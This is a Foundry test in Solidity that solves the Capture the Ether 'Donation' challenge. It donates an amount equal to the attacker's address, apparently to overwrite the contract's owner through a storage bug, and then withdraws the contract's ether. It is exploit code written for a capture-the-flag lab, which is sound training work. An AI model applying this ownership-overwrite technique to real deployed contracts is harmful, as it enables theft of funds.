// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/utils/BytesDeployer.sol";

interface IDonationChallenge {
    function donate(uint256) external payable;
    function withdraw() external;
    function owner() external view returns (address);
    function isComplete() external view returns (bool);
}

contract DonationChallengeTest is Test {
    IDonationChallenge public donationChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        Deployer deployer = new Deployer();
        donationChallenge = IDonationChallenge(
            deployer.deployContract{value: 1 ether}("src/Capture_the_Ether/Math/Donation/DonationChallenge.sol")
        );
    }

    function testDonation() public {
        uint256 amount = uint256(uint160(hacker));
        uint256 val = amount / (10 ** 18 * 1 ether);
        payable(hacker).transfer(val);

        emit log_named_address("donationChallenge's owner", donationChallenge.owner());
        emit log_named_uint("donationChallenge's balance", address(donationChallenge).balance);
        emit log_named_uint("hacker's balance", hacker.balance);

        vm.startPrank(hacker);
        donationChallenge.donate{value: val}(amount);
        emit log_named_address("after hack, donationChallenge's owner", donationChallenge.owner());
        emit log_named_address("hacker's address", hacker);

        donationChallenge.withdraw();
        vm.stopPrank();

        emit log_named_uint("after hack, donationChallenge's balance", address(donationChallenge).balance);
        emit log_named_uint("after hack, hacker's balance", hacker.balance);

        assertTrue(donationChallenge.isComplete());
    }
}
